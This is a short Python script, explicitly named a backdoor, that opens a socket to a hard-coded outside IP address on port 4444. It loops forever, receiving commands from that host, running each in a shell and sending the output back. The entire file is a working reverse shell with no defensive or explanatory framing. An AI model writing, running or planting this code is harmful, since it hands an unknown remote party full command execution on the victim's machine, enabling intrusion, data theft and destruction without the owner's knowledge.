import socket
import subprocess


server_ip = '26.29.81.249'
port = 4444
backdoor = socket.socket()
backdoor.connect((server_ip, port))
while True:
    command = backdoor.recv(100000)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print(output + output_error)
    backdoor.send(output + output_error)